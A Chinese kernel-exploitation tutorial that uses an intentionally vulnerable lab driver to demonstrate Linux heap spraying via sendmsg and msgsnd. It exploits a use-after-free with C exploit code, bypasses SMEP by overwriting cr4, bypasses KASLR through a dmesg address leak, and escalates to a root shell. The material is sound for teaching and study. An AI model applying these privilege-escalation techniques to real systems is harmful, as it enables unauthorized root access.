> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.jianshu.com](https://www.jianshu.com/p/5583657cfd25)

本文从[我的先知](https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6286)转过来。  
说明：实验所需的驱动源码、bzImage、cpio 文件见[我的 github](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbsauce%2Fkernel_exploit_series) 进行下载。本教程适合对漏洞提权有一定了解的同学阅读，具体可以看看我先知之前的文章，或者[我的简书](https://www.jianshu.com/u/a12c5b882be2)。

一、 堆喷函数介绍
=========

在 linux 内核下进行堆喷射时，首先需要注意喷射的堆块的大小，因为只有大小相近的堆块才保存在相同的 cache 中。具体的 cache 块分布如下图：

![](http://upload-images.jianshu.io/upload_images/6349402-675e795c4d744a03.png) cache_distrubute.png

本文的漏洞例子中 uaf_obj 对象的大小是 84，实际申请时会分配一个 96 字节的堆块。本例中我们可以申请 96 大小的 k_object 对象，并在堆块上任意布置数据，但这样的话就太简单了点，实际漏洞利用中怎么会这么巧就让你控制堆上的数据呢。所以我们需要找到某些用户可调用的函数，它会在内核空间申请指定大小的 chunk（本例中我们希望能分配到 96 字节的块），并把用户的数据拷贝过去。

### （1）sendmsg

```
static int ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,
             struct msghdr *msg_sys, unsigned int flags,
             struct used_address *used_address,
             unsigned int allowed_msghdr_flags)
{
    struct compat_msghdr __user *msg_compat =
        (struct compat_msghdr __user *)msg;
    struct sockaddr_storage address;
    struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
    unsigned char ctl[sizeof(struct cmsghdr) + 20]
                __aligned(sizeof(__kernel_size_t)); // 创建44字节的栈缓冲区ctl，20是ipv6_pktinfo结构的大小
    unsigned char *ctl_buf = ctl; // ctl_buf指向栈缓冲区ctl
    int ctl_len;
    ssize_t err;

    msg_sys->msg_name = &address;

    if (MSG_CMSG_COMPAT & flags)
        err = get_compat_msghdr(msg_sys, msg_compat, NULL, &iov);
    else
        err = copy_msghdr_from_user(msg_sys, msg, NULL, &iov); // 用户数据拷贝到msg_sys，只拷贝msghdr消息头部
    if (err < 0)
        return err;

    err = -ENOBUFS;

    if (msg_sys->msg_controllen > INT_MAX) //如果msg_sys小于INT_MAX，就把ctl_len赋值为用户提供的msg_controllen
        goto out_freeiov;
    flags |= (msg_sys->msg_flags & allowed_msghdr_flags);
    ctl_len = msg_sys->msg_controllen;
    if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
        err =
            cmsghdr_from_user_compat_to_kern(msg_sys, sock->sk, ctl,
                             sizeof(ctl));
        if (err)
            goto out_freeiov;
        ctl_buf = msg_sys->msg_control;
        ctl_len = msg_sys->msg_controllen;
    } else if (ctl_len) {
        BUILD_BUG_ON(sizeof(struct cmsghdr) !=
                 CMSG_ALIGN(sizeof(struct cmsghdr)));
        if (ctl_len > sizeof(ctl)) {  //注意用户数据的size必须大于44字节
            ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);//sock_kmalloc最后会调用kmalloc 分配 ctl_len 大小的堆块
            if (ctl_buf == NULL)
                goto out_freeiov;
        }
        err = -EFAULT;
        /* 注意，msg_sys->msg_control是用户可控的用户缓冲区；ctl_len是用户可控的长度。  用户数据拷贝到ctl_buf内核空间。
         */
        if (copy_from_user(ctl_buf,
                   (void __user __force *)msg_sys->msg_control,
                   ctl_len))
            goto out_freectl;
        msg_sys->msg_control = ctl_buf;
    }
    msg_sys->msg_flags = flags;
...


```

**结论**：只要传入 size 大于 44，就能控制 kmalloc 申请的内核空间的数据。

**数据流**：

> `msg` ---> `msg_sys` ---> `msg_sys->msg_controllen` ---> `ctl_len`
> 
> `msg` ---> `msg_sys->msg_control` ---> `ctl_buf`

**利用流程**：

```
//限制: BUFF_SIZE > 44
char buff[BUFF_SIZE];
struct msghdr msg = {0};
struct sockaddr_in addr = {0};
int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
addr.sin_family = AF_INET;
addr.sin_port = htons(6666);
// 布置用户空间buff的内容
msg.msg_control = buff;
msg.msg_controllen = BUFF_SIZE; 
msg.msg_name = (caddr_t)&addr;
msg.msg_namelen = sizeof(addr);
// 假设此时已经产生释放对象，但指针未清空
for(int i = 0; i < 100000; i++) {
  sendmsg(sockfd, &msg, 0);
}
// 触发UAF即可


```

### （2）msgsnd

```
// /ipc/msg.c
SYSCALL_DEFINE4(msgsnd, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz,
        int, msgflg)
{
    return ksys_msgsnd(msqid, msgp, msgsz, msgflg);
}
// /ipc/msg.c
long ksys_msgsnd(int msqid, struct msgbuf __user *msgp, size_t msgsz,
         int msgflg)
{
    long mtype;

    if (get_user(mtype, &msgp->mtype))
        return -EFAULT;
    return do_msgsnd(msqid, mtype, msgp->mtext, msgsz, msgflg);
}
// /ipc/msg.c
static long do_msgsnd(int msqid, long mtype, void __user *mtext,
        size_t msgsz, int msgflg)
{
    struct msg_queue *msq;
    struct msg_msg *msg;
    int err;
    struct ipc_namespace *ns;
    DEFINE_WAKE_Q(wake_q);

    ns = current->nsproxy->ipc_ns;

    if (msgsz > ns->msg_ctlmax || (long) msgsz < 0 || msqid < 0)
        return -EINVAL;
    if (mtype < 1)
        return -EINVAL;
  msg = load_msg(mtext, msgsz);  // 调用load_msg
...
// /ipc/msgutil.c
struct msg_msg *load_msg(const void __user *src, size_t len)
{
    struct msg_msg *msg;
    struct msg_msgseg *seg;
    int err = -EFAULT;
    size_t alen;

    msg = alloc_msg(len);  // alloc_msg
    if (msg == NULL)
        return ERR_PTR(-ENOMEM);

    alen = min(len, DATALEN_MSG); // DATALEN_MSG
    if (copy_from_user(msg + 1, src, alen)) // copy1
        goto out_err;

    for (seg = msg->next; seg != NULL; seg = seg->next) {
        len -= alen;
        src = (char __user *)src + alen;
        alen = min(len, DATALEN_SEG);
        if (copy_from_user(seg + 1, src, alen)) // copy2
            goto out_err;
    }

    err = security_msg_msg_alloc(msg);
    if (err)
        goto out_err;

    return msg;

out_err:
    free_msg(msg);
    return ERR_PTR(err);
}
// /ipc/msgutil.c
#define DATALEN_MSG ((size_t)PAGE_SIZE-sizeof(struct msg_msg))
static struct msg_msg *alloc_msg(size_t len)
{
    struct msg_msg *msg;
    struct msg_msgseg **pseg;
    size_t alen;

    alen = min(len, DATALEN_MSG);
    msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); // 先分配了一个msg_msg结构大小
...


```

`msgsnd()`--->`ksys_msgsnd()`--->`do_msgsnd()`。

do_msgsnd() 根据用户传递的 buffer 和 size 参数调用 load_msg(mtext, msgsz)，load_msg() 先调用 alloc_msg(msgsz) 创建一个 msg_msg 结构体（），然后拷贝用户空间的 buffer 紧跟 msg_msg 结构体的后面，相当于给 buffer 添加了一个头部，因为 msg_msg 结构体大小等于 0x30，因此用户态的 buffer 大小等于`xx-0x30`。

**结论**：前 0x30 字节不可控。数据量越大（本文示例是 96 字节），发生阻塞可能性越大，120 次发送足矣。

**利用流程**：

```
// 只能控制0x30字节以后的内容
struct {
  long mtype;
  char mtext[BUFF_SIZE];
}msg;
memset(msg.mtext, 0x42, BUFF_SIZE-1); // 布置用户空间的内容
msg.mtext[BUFF_SIZE] = 0;
int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
msg.mtype = 1; //必须 > 0
// 假设此时已经产生释放对象，但指针未清空
for(int i = 0; i < 120; i++)
  msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
// 触发UAF即可


```

二、 漏洞分析
=======

### （1）代码分析

我们以[漏洞驱动 - vuln_driver](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Finvictus-0x90%2Fvulnerable_linux_driver) 来进行实践。vuln_driver 驱动包含漏洞有任意地址读写、空指针引用、未初始化栈变量、UAF 漏洞、缓冲区溢出。本文主要分析 UAF 漏洞及其利用。

```
// vuln_driver.c: do_ioctl()驱动号分配函数
static long do_ioctl(struct file *filp, unsigned int cmd, unsigned long args)
{
    int ret;
    unsigned long *p_arg = (unsigned long *)args;
    ret = 0;

    switch(cmd) {
        case DRIVER_TEST:
            printk(KERN_WARNING "[x] Talking to device [x]\n");
            break;
        case ALLOC_UAF_OBJ:
            alloc_uaf_obj(args);
            break;
        case USE_UAF_OBJ:
            use_uaf_obj();
            break;
        case ALLOC_K_OBJ:
            alloc_k_obj((k_object *) args);
            break;
        case FREE_UAF_OBJ:
            free_uaf_obj();
            break;
    }
    return ret;
}


```

```
//uaf对象的结构，包含一个函数指针fn，size=84
    typedef struct uaf_obj
    {
        char uaf_first_buff[56];
        long arg;
        void (*fn)(long);
        char uaf_second_buff[12];
    }uaf_obj;


```

```
//k_object对象用于测试
typedef struct k_object
    {
        char kobj_buff[96];
    }k_object;


```

主要代码如下，漏洞就是在释放堆时，未将存放堆地址的全局变量清零。

```
// 1. uaf_callback() 一个简单的回调函数
  uaf_obj *global_uaf_obj = NULL;
  static void uaf_callback(long num)
    {
        printk(KERN_WARNING "[-] Hit callback [-]\n");
    }   

// 2. 分配一个uaf对象，fn指向回调函数uaf_callback，第一个缓冲区uaf_first_buff填充"A"。 global_uaf_obj全局变量指向该对象
    static int alloc_uaf_obj(long __user arg)
    {
        struct uaf_obj *target;
        target = kmalloc(sizeof(uaf_obj), GFP_KERNEL);

        if(!target) {
            printk(KERN_WARNING "[-] Error no memory [-]\n");
            return -ENOMEM;
        }
        target->arg = arg;
        target->fn = uaf_callback;
        memset(target->uaf_first_buff, 0x41, sizeof(target->uaf_first_buff));

        global_uaf_obj = target;
        printk(KERN_WARNING "[x] Allocated uaf object [x]\n");
        return 0;
    }

// 3. 释放uaf对象，但未清空global_uaf_obj指针
    static void free_uaf_obj(void)
    {
        kfree(global_uaf_obj);
        //global_uaf_obj = NULL 
        printk(KERN_WARNING "[x] uaf object freed [x]");
    }

// 4. 使用uaf对象，调用成员fn指向的函数
    static void use_uaf_obj(void)
    {
        if(global_uaf_obj->fn)
        {
            //debug info
            printk(KERN_WARNING "[x] Calling 0x%p(%lu)[x]\n", global_uaf_obj->fn, global_uaf_obj->arg);

            global_uaf_obj->fn(global_uaf_obj->arg);
        }
    }

// 5. 分配k_object对象，并从用户地址user_kobj拷贝数据到分配的地址
    static int alloc_k_obj(k_object *user_kobj)
    {
        k_object *trash_object = kmalloc(sizeof(k_object), GFP_KERNEL);
        int ret;

        if(!trash_object) {
            printk(KERN_WARNING "[x] Error allocating k_object memory [-]\n");
            return -ENOMEM;
        }

        ret = copy_from_user(trash_object, user_kobj, sizeof(k_object));
        printk(KERN_WARNING "[x] Allocated k_object [x]\n");
        return 0;
    }


```

### （2）利用思路

思路：如果 uaf_obj 被释放，但指向它的 global_uaf_obj 变量未清零，若另一个对象分配到相同的 cache，并且能够控制该 cache 上的内容，我们就能控制 fn() 调用的函数。

测试：本例中我们可以利用 k_object 对象来布置堆数据，将 uaf_obj 对象的 fn 指针覆盖为 0x4242424242424242。

```
//完整代码见easy_uaf.c
void use_after_free_kobj(int fd)
{
     k_object *obj = malloc(sizeof(k_object));
    
    //60 bytes overwrites the last 4 bytes of the address
    memset(obj->buff, 0x42, 60); 

    ioctl(fd, ALLOC_UAF_OBJ, NULL);
    ioctl(fd, FREE_UAF_OBJ, NULL);

    ioctl(fd, ALLOC_K_OBJ, obj);
    ioctl(fd, USE_UAF_OBJ, NULL);
}


```

报错结果如下：

![](http://upload-images.jianshu.io/upload_images/6349402-8b10fea84acfd99b.png) easy_uaf_fault.png

三、 漏洞利用
=======

### （1）绕过 SMEP

##### 1. 绕过 SMEP 防护方法

CR4 寄存器的第 20 位为 1，则表示开启了 SMEP，若执行到用户指令，就会报错`"BUG: unable to handle kernel paging request at 0xxxxxx"`。绕过 SMEP 的方法见我的笔记 [https://www.jianshu.com/p/6f1d2f3f5126](https://www.jianshu.com/p/6f1d2f3f5126)。不过最简单的方法是通过`native_write_cr4()`函数：

```
// /arch/x86/include/asm/special_insns.h
static inline void native_write_cr4(unsigned long val)
{
    asm volatile("mov %0,%%cr4": : "r" (val), "m" (__force_order));
}


```

本文用到的 vuln_driver 简化了利用过程，否则我们还需要控制第 1 个参数，所以利用目标就是：`global_uaf_obj->fn(global_uaf_obj->arg)` ---> `native_write_cr4(global...->arg)`。 也即执行`native_write_cr4(0x407f0)`即可。

##### 2. 堆喷函数

**sendmsg 注意**：分配堆块必须大于 44。

```
//用sendmsg构造堆喷，一个通用接口搞定，只需传入待执行的目标地址+参数
void use_after_free_sendmsg(int fd, size_t target, size_t arg)
{
    char buff[BUFF_SIZE];
    struct msghdr msg={0};
    struct sockaddr_in addr={0};
    int sockfd = socket(AF_INET,SOCK_DGRAM,0);
    // 布置堆喷数据
    memset(buff,0x43,sizeof buff);
    memcpy(buff+56,&arg,sizeof(long));
    memcpy(buff+56+(sizeof(long)),&target,sizeof(long));

    addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
    addr.sin_family=AF_INET;
    addr.sin_port=htons(6666);

    // buff是堆喷射的数据，BUFF_SIZE是最后要调用KMALLOC申请的大小
    msg.msg_control=buff;
    msg.msg_controllen=BUFF_SIZE;
    msg.msg_name=(caddr_t)&addr;
    msg.msg_namelen= sizeof(addr);
    // 构造UAF对象
    ioctl(fd,ALLOC_UAF_OBJ,NULL);
    ioctl(fd,FREE_UAF_OBJ,NULL);
    //开始堆喷
    for (int i=0;i<10000;i++){
        sendmsg(sockfd,&msg,0);
    }
    //触发
    ioctl(fd,USE_UAF_OBJ,NULL);
}


```

```
//用msgsnd构造堆喷
int use_after_free_msgsnd(int fd, size_t target, size_t arg)
{
    int new_len=BUFF_SIZE-48;
    struct {
        size_t mtype;
        char mtext[new_len];
    } msg;
    //布置堆喷数据，必须减去头部48字节
    memset(msg.mtext,0x42,new_len-1);
    memcpy(msg.mtext+56-48,&arg,sizeof(long));
    memcpy(msg.mtext+56-48+(sizeof(long)),&target,sizeof(long));
    msg.mtext[new_len]=0;
    msg.mtype=1; //mtype必须 大于0

    // 创建消息队列
    int msqid=msgget(IPC_PRIVATE,0644 | IPC_CREAT);
    // 构造UAF对象
    ioctl(fd, ALLOC_UAF_OBJ,NULL);
    ioctl(fd,FREE_UAF_OBJ,NULL);
    //开始堆喷
    for (int i=0;i<120;i++)
        msgsnd(msqid,&msg,sizeof(msg.mtext),0);
    //触发
    ioctl(fd,USE_UAF_OBJ,NULL);
}


```

**msgsnd 注意**：msgsnd 堆喷必须减去头部长度 48，前 48 字节不可控。

##### 3. 绕过 SMEP 测试

完整代码见`test_smep.c`。

注意：暂时先关闭 ASLR，单核启动，修改`start.sh`脚本即可。

```
int main()
{
    size_t native_write_cr4_addr=0xffffffff81065a30;
    size_t fake_cr4=0x407e0;

    void *addr=mmap((void *)MMAP_ADDR,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_SHARED|MAP_ANON,0,0);
    void **fn=MMAP_ADDR;
    // 拷贝stub代码到 MMAP_ADDR
    memcpy(fn,stub,128);
    int fd=open(PATH,O_RDWR);
    //用于标识dmesg中字符串的开始
    ioctl(fd,DRIVER_TEST,NULL);
    /*
    use_after_free_sendmsg(fd,native_write_cr4_addr,fake_cr4);
    use_after_free_sendmsg(fd,MMAP_ADDR,0);
    */
    
    use_after_free_msgsnd(fd,native_write_cr4_addr,fake_cr4);
    use_after_free_msgsnd(fd,MMAP_ADDR,0);
    
    return 0;
}


```

修改 cr4 之前，执行用户代码会报错：

![](http://upload-images.jianshu.io/upload_images/6349402-b9f1f4005ebb6932.png) 3-page_fault2.png

修改 cr4 之后，能够执行到用户代码：

![](http://upload-images.jianshu.io/upload_images/6349402-853bb7c5c0fd8040.png) 4-succeed_smep_sendmsg.png

### （2）绕过 KASLR

##### 1. 方法

**注意**：`start.sh`中开启 ASLR。

**目标**：泄露 kernel 地址，获取`native_write_cr4`、`prepare_kernel_cred`、`commit_creds`函数地址。

**说明**：一般都会开启`kptr_restrict`保护，不能读取`/proc/kallsyms`，但是通常可以`dmesg`读取内核打印的信息。

**方法**：由 dmesg 可以想到，构造 pagefault，利用内核打印信息来泄露 kernel 地址。

![](http://upload-images.jianshu.io/upload_images/6349402-b3ae8e833129a041.png) 6-dmesg_kernel_addr.png

如上图所示，可以利用`SyS_ioctl+0x79/0x90`来泄露 kernel 地址，接下来只需寻找目标函数地址的相对偏移即可。

```
# [<ffffffff8122bc59>] SyS_ioctl+0x79/0x90
/ # cat /proc/kallsyms | grep native_write_cr4
ffffffff81065a30 t native_write_cr4
/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff810a6ca0 T prepare_kernel_cred
/ # cat /proc/kallsyms | grep commit_creds
ffffffff810a68b0 T commit_creds


```

##### 2. 步骤

*   在子线程中触发 page_fault，从 dmesg 读取打印信息
*   找到`SyS_ioctl+0x79`地址，计算 kernel_base
*   计算 3 个目标函数地址

### （3）整合 exp

##### 1. 单核运行

```
//让程序只在单核上运行，以免只关闭了1个核的smep，却在另1个核上跑shell
void force_single_core()
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0,&mask);

    if (sched_setaffinity(0,sizeof(mask),&mask))
        printf("[-----] Error setting affinity to core0, continue anyway, exploit may fault \n");
    return;
}


```

##### 2. 泄露 kernel 基址

```
// 构造 page_fault 泄露kernel地址。从dmesg读取后写到/tmp/infoleak，再读出来
    pid_t pid=fork();
    if (pid==0){
        do_page_fault();
        exit(0);
    }
    int status;
    wait(&status);    // 等子进程结束
    //sleep(10);
    printf("[+] Begin to leak address by dmesg![+]\n");
    size_t kernel_base = get_info_leak()-sys_ioctl_offset;
    printf("[+] Kernel base addr : %p [+] \n", kernel_base);

    native_write_cr4_addr+=kernel_base;
    prepare_kernel_cred_addr+=kernel_base;
    commit_creds_addr+=kernel_base;


```

##### 3. 关闭 smep, 并提权

```
  //关闭smep,并提权
    use_after_free_sendmsg(fd,native_write_cr4_addr,fake_cr4);
    use_after_free_sendmsg(fd,get_root,0);   //MMAP_ADDR
    //use_after_free_msgsnd(fd,native_write_cr4_addr,fake_cr4);
    //use_after_free_msgsnd(fd,get_root,0);  //MMAP_ADDR

    if (getuid()==0)
    {
        printf("[+] Congratulations! You get root shell !!! [+]\n");
        system("/bin/sh");
    }


```

### （4）问题

原文的 exploit 有问题，是将 get_root() 代码用 mmap 映射到 0x100000000000，然后跳转过去执行，但是直接把代码拷贝过去会有地址引用错误。

```
#执行0x100000000000处的内容时产生pagefault，可能是访问0x1000002ce8fd地址出错
 gdb-peda$ x /10i $pc
=> 0x100000000000:  push   rbp
   0x100000000001:  mov    rbp,rsp
   0x100000000004:  push   rbx
   0x100000000005:  sub    rsp,0x8
   0x100000000009:  
    mov    rbx,QWORD PTR [rip+0x2ce8ed]        # 0x1000002ce8fd
   0x100000000010:  
    mov    rax,QWORD PTR [rip+0x2ce8ee]        # 0x1000002ce905
   0x100000000017:  mov    edi,0x0
   0x10000000001c:  call   rax
   0x10000000001e:  mov    rdi,rax
   0x100000000021:  call   rbx
#报错信息如下：
[   10.421887] BUG: unable to handle kernel paging request at 00001000002ce8fd
[   10.424836] IP: [<0000100000000009>] 0x100000000009


```

解决：不需要将`get_root()`代码拷贝到 0x100000000000，直接执行`get_root()`即可。

最后成功提权：

![](http://upload-images.jianshu.io/upload_images/6349402-e7acc391a0b92414.png) 7-exp_succeed.png

exp 代码见`exp_heap_spray.c`。

### 参考：

[https://invictus-security.blog/2017/06/15/linux-kernel-heap-spraying-uaf/](https://links.jianshu.com/go?to=https%3A%2F%2Finvictus-security.blog%2F2017%2F06%2F15%2Flinux-kernel-heap-spraying-uaf%2F)

[http://edvison.cn/2018/07/25/%E5%A0%86%E5%96%B7%E5%B0%84/](https://links.jianshu.com/go?to=http%3A%2F%2Fedvison.cn%2F2018%2F07%2F25%2F%25E5%25A0%2586%25E5%2596%25B7%25E5%25B0%2584%2F)

[https://github.com/invictus-0x90/vulnerable_linux_driver](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Finvictus-0x90%2Fvulnerable_linux_driver)

[https://turingsec.github.io/CVE-2016-0728/](https://links.jianshu.com/go?to=https%3A%2F%2Fturingsec.github.io%2FCVE-2016-0728%2F)